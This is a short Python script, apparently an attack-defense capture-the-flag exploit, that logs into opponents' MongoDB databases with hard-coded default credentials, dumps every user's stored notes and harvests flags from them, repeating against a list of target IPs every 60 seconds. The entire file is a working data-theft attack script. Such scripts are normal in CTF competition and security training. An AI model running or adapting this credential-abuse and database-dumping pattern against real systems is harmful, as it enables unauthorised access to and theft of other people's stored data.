from mongo_utils import get_db_manager
from flag_utils import check_flag
from exploit_runtime import exp_runtime


def dump_mongo(col_manager):
    users = col_manager.find()
    flags = set()
    for user in users:
        for note in user['notes']:
            possible_flags = set(check_flag(note['content']))
            flags = flags.union(possible_flags)
    return flags


def exploit(opponent_ip):
    mongo_config = {
        "hostname": opponent_ip,
        "port": 27017,
        "db_name": "memowotoru",
        "user": "light",
        "password": "yagami"
    }
    col_manager, _ = get_db_manager(mongo_config)
    flags = dump_mongo(col_manager)
    return flags


if __name__ == "__main__":
    opponents = ["127.0.0.1"]
    exp_runtime(exploit, opponents, sleep_time=60)
